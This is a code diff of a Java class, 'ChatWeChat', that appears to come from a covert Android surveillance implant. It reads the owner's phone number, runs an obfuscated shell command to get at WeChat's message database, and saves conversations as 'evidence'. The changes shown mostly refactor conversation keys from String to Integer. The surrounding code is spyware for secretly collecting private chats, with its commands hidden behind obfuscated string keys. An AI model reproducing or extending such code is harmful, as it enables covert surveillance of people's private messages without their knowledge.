@@ -35,7 +35,7 @@ public class ChatWeChat extends SubModuleChat {
 
 	//ChatGroups groups = new ChatWhatsappGroups();
 
-	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();
+	Hashtable<Integer, Integer> hastableConversationLastIndex = new Hashtable<Integer, Integer>();
 	private static final int PROGRAM = 0x0a;
 
 	private static final String DEFAULT_LOCAL_NUMBER = "local";
@@ -80,7 +80,7 @@ public class ChatWeChat extends SubModuleChat {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualStart)");
 		}
-		hastableConversationLastIndex = new Hashtable<String, Integer>();
+		hastableConversationLastIndex = new Hashtable<Integer, Integer>();
 		try {
 			myPhoneNumber = readMyPhoneNumber();
 			
@@ -92,11 +92,11 @@ public class ChatWeChat extends SubModuleChat {
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WECHAT, myPhoneNumber);
 
 			if (markup.isMarkup()) {
-				hastableConversationLastIndex = (Hashtable<String, Integer>) markup.readMarkupSerializable();
-				Enumeration<String> keys = hastableConversationLastIndex.keys();
+				hastableConversationLastIndex = (Hashtable<Integer, Integer>) markup.readMarkupSerializable();
+				Enumeration<Integer> keys = hastableConversationLastIndex.keys();
 
 				while (keys.hasMoreElements()) {
-					String key = keys.nextElement();
+					int key = keys.nextElement();
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
 					}
@@ -122,6 +122,7 @@ public class ChatWeChat extends SubModuleChat {
 
 
 		String filename = Messages.getString("f_d");
+		
 		try {
 			Runtime.getRuntime().exec(Messages.getString("f_2") + filename);
 			File file = new File(filename);
@@ -239,7 +240,7 @@ public class ChatWeChat extends SubModuleChat {
 				// for every conversation, fetch and save message and update
 				// markup
 				for (Pair<Integer, Integer> pair : changedConversations) {
-					String conversation = Integer.toString(pair.first);
+					int conversation = pair.first;
 					int lastReadIndex = pair.second;
 
 					/*if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
@@ -369,7 +370,7 @@ public class ChatWeChat extends SubModuleChat {
 	 * @param lastReadIndex
 	 * @return
 	 */
-	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
+	private int fetchMessages(SQLiteDatabase db, int conversation, int lastReadIndex) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastReadIndex);
 		}
@@ -383,7 +384,7 @@ public class ChatWeChat extends SubModuleChat {
 		// receipt_server_timestamp INTEGER, receipt_device_timestamp INTEGER,
 		// raw_data BLOB)
 
-		String peer = clean(conversation);
+		String peer = "";//clean(conversation);
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		// f.a=messages
